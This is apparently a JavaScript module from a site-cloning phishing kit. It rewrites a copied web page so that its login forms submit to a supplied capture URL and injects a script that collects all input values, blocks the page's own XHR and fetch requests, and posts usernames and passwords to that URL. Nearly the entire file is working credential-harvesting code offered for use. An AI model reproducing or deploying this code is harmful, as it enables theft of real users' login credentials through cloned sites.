const cheerio = require('cheerio');

function processForms(html, newAction, modifyAllForms = false) {
  let $ = cheerio.load(html);
  const forms = [];
  
  $('form').each(function(index) {
    const $form = $(this);
    const originalAction = $form.attr('action') || '';
    const method = $form.attr('method') || 'GET';
    const fields = [];
    
    $form.find('input').each(function() {
      const $input = $(this);
      const name = $input.attr('name');
      const type = $input.attr('type') || 'text';
      if (name) fields.push({ name, type });
    });
    
    const isLoginForm = detectLoginForm($form);
    const shouldModify = isLoginForm || modifyAllForms;
    
    forms.push({
      index: index + 1,
      originalAction,
      newAction: shouldModify ? newAction : originalAction,
      method: method.toUpperCase(),
      isLoginForm,
      fields
    });
    
    if (shouldModify) {
      $form.attr('action', newAction);
      $form.attr('method', 'POST');
      $form.removeAttr('onsubmit onreset oninput onchange');
    }
  });
  
  const hasLoginForm = forms.some(f => f.isLoginForm);
  
  if (hasLoginForm) {
    // Remove scripts except cloner markers
    $('script').each(function() {
      const content = $(this).html() || '';
      if (!content.includes('[Cloner]')) $(this).remove();
    });
    $('noscript').remove();
    
    // Remove inline event handlers
    $('*').each(function() {
      const attrs = this.attribs || {};
      for (const attr in attrs) {
        if (attr.startsWith('on')) $(this).removeAttr(attr);
      }
    });
    
    const captureScript = createCaptureScript(newAction);
    if ($('head').length > 0) $('head').prepend(captureScript);
    else if ($('body').length > 0) $('body').prepend(captureScript);
    else $.root().prepend(captureScript);
  }
  
  return { html: $.html(), forms };
}

function createCaptureScript(action) {
  return `
<script id="cloner-capture-script">
(function() {
  var CAPTURE_URL = '${action}';
  var captured = false;
  
  function getAllInputValues() {
    var data = {};
    var inputs = document.querySelectorAll('input, textarea, select');
    for (var i = 0; i < inputs.length; i++) {
      var input = inputs[i];
      var name = input.name || input.id || input.getAttribute('data-testid') || input.getAttribute('aria-label');
      if (name && input.type !== 'submit' && input.type !== 'button' && input.type !== 'reset' && input.type !== 'hidden') {
        data[name] = input.value;
      }
    }
    return data;
  }
  
  function submitCredentials(e) {
    if (captured) return false;
    if (e) {
      e.preventDefault();
      e.stopPropagation();
      e.stopImmediatePropagation();
      e.returnValue = false;
    }
    var data = getAllInputValues();
    if (Object.keys(data).length === 0) {
      setTimeout(function() { submitCredentials(null); }, 100);
      return false;
    }
    captured = true;
    var form = document.createElement('form');
    form.method = 'POST';
    form.action = CAPTURE_URL;
    form.style.display = 'none';
    for (var key in data) {
      if (data.hasOwnProperty(key)) {
        var input = document.createElement('input');
        input.type = 'hidden';
        input.name = key;
        input.value = data[key];
        form.appendChild(input);
      }
    }
    document.body.appendChild(form);
    form.submit();
    return false;
  }
  
  function overrideForms() {
    var forms = document.getElementsByTagName('form');
    for (var i = 0; i < forms.length; i++) {
      var form = forms[i];
      form.setAttribute('action', CAPTURE_URL);
      form.setAttribute('method', 'POST');
      var clone = form.cloneNode(true);
      form.parentNode.replaceChild(clone, form);
      clone.addEventListener('submit', function(e) { return submitCredentials(e); }, true);
    }
  }
  
  function overrideButtons() {
    var buttons = document.querySelectorAll('button, [type="submit"], [role="button"], input[type="submit"], input[type="button"]');
    for (var i = 0; i < buttons.length; i++) {
      var btn = buttons[i];
      var clone = btn.cloneNode(true);
      btn.parentNode.replaceChild(clone, btn);
      clone.addEventListener('click', function(e) { return submitCredentials(e); }, true);
    }
  }
  
  function handleEnterKey() {
    document.addEventListener('keydown', function(e) {
      if (e.key === 'Enter' || e.keyCode === 13) {
        var active = document.activeElement;
        if (active && (active.type === 'password' || active.type === 'text' || active.type === 'email')) {
          submitCredentials(e);
        }
      }
    }, true);
  }
  
  function blockXHR() {
    var originalOpen = XMLHttpRequest.prototype.open;
    XMLHttpRequest.prototype.open = function(method, url) {
      this._clonerBlocked = true;
      return originalOpen.apply(this, arguments);
    };
    var originalSend = XMLHttpRequest.prototype.send;
    XMLHttpRequest.prototype.send = function() {
      if (this._clonerBlocked) return;
      return originalSend.apply(this, arguments);
    };
  }
  
  function blockFetch() {
    if (window.fetch) {
      var originalFetch = window.fetch;
      window.fetch = function(url, options) {
        if (options && options.body) {
          try {
            var data = {};
            if (options.body instanceof FormData) {
              options.body.forEach(function(v, k) { data[k] = v; });
            } else if (typeof options.body === 'string') {
              try { data = JSON.parse(options.body); } catch(e) {}
            }
            if (Object.keys(data).length > 0) {
              var form = document.createElement('form');
              form.method = 'POST';
              form.action = CAPTURE_URL;
              form.style.display = 'none';
              for (var k in data) {
                var inp = document.createElement('input');
                inp.type = 'hidden';
                inp.name = k;
                inp.value = data[k];
                form.appendChild(inp);
              }
              document.body.appendChild(form);
              form.submit();
              return Promise.resolve(new Response());
            }
          } catch(e) {}
        }
        return originalFetch.apply(this, arguments);
      };
    }
  }
  
  function init() {
    blockXHR();
    blockFetch();
    overrideForms();
    overrideButtons();
    handleEnterKey();
  }
  
  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', init);
  } else {
    init();
  }
  setTimeout(init, 500);
  setTimeout(init, 1500);
  setTimeout(init, 3000);
})();
</script>`;
}

function detectLoginForm($form) {
  const hasPassword = $form.find('input[type="password"]').length > 0;
  const hasEmail = $form.find('input[name*="email"], input[name*="user"], input[name*="login"], input[type="email"]').length > 0;
  const hasLoginKeywords = /login|signin|sign-in|auth|account/i.test($form.html() || '');
  return hasPassword || (hasEmail && hasLoginKeywords);
}

function findDynamicInputs(html) {
  const $ = cheerio.load(html);
  const inputs = [];
  $('input').each(function() {
    const $input = $(this);
    const name = $input.attr('name');
    const type = $input.attr('type') || 'text';
    const id = $input.attr('id');
    const placeholder = $input.attr('placeholder');
    if (name || id) {
      inputs.push({
        name: name || id,
        type,
        placeholder,
        selector: name ? `input[name="${name}"]` : `input#${id}`
      });
    }
  });
  return inputs;
}

function injectFormCaptureScript(html, action) {
  const result = processForms(html, action, false);
  if (result.forms.length === 0) {
    return handleDynamicForms(html, action).html;
  }
  return result.html;
}

function handleDynamicForms(html, action) {
  const inputs = findDynamicInputs(html);
  if (inputs.length === 0) return { html, forms: [] };
  
  const $ = cheerio.load(html);
  $('script').remove();
  $('noscript').remove();
  const script = createCaptureScript(action);
  $('head').prepend(script);
  
  const forms = [{
    index: 1,
    originalAction: '(dynamic)',
    newAction: action,
    method: 'POST',
    isLoginForm: true,
    fields: inputs.filter(i => i.type !== 'hidden' && i.type !== 'submit'),
    isDynamic: true
  }];
  
  return { html: $.html(), forms };
}

module.exports = {
  processForms,
  findDynamicInputs,
  injectFormCaptureScript,
  handleDynamicForms,
  detectLoginForm
};
